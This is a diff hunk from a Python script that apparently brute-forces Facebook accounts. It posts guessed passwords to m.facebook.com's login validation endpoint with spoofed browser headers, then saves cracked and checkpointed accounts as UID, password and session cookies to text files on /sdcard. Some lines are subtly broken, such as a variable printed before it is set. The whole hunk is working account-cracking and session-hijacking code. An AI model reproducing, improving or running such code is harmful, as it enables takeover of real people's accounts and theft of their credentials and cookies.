@@ -515,27 +515,25 @@ def _M4_(ids,pasc):
                         heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':pro,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                         po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)  
                         po=session.cookies.get_dict().keys()
-                        if "checkpoint" in po.cookies.get_dict().keys():
-                            print(f'\r\033[0;95m[{time.strftime("%H:%M")}•DRACO-Cp] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
-                            os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
-                            open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
-                            akun.append(idf+' • '+pw)
-                            cp+=1
-                            break
-                        elif "c_user" in ses.cookies.get_dict().keys():
-                             ok+=1
-                             coki=po.cookies.get_dict()
-                             kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                             print(f'\r\033[10;92m[{time.strftime("%H:%M")}•DRACO-Ok] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
-                             os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
-                             open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
-                             break
-                
+                        if 'c_user' in po:
+                                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                                uid = re.findall('c_user=(.*);xs', coki)[0]
+                                print(f'\r\r{G}[ATOM-OK]: {uid} | {ps}')
+                                print(f"\r\033[38;5;46mCOOKIES=[🤖]: \033[1;37m{coki}\33[1;36m")
+                             #######   print(f'\033[38;5;196m─────────────────────────────────────────────────\033[1;37m')
+                                open('/sdcard/ATOM-OK.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
+                                ok.append(uid)
+                                break
+                        elif 'checkpoint' in po:
+                        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                        	    cid = coki[24:39]
+                        	    print(f'\r\r {R}[ATOM-CP] {uid} | {ps}')
+                        	    open('/sdcard/ATOM-M6-CP.txt','a').write(uid+'|'+ps+'\n')
+                        	    cp.append(cid)
+                        	    break
                         else:continue
-       except requests.exceptions.ConnectionError:
-               time.sleep(31)
-               loop+=1
-       except:pass
+                loop+=1
+        except:pass
 #━━━━━━━━━━━━━[MATHOD━FREE━M5]━━━━━━━━━━━━━━━━# b-graph 
 def _M5_(ids,pasd):
         global loop
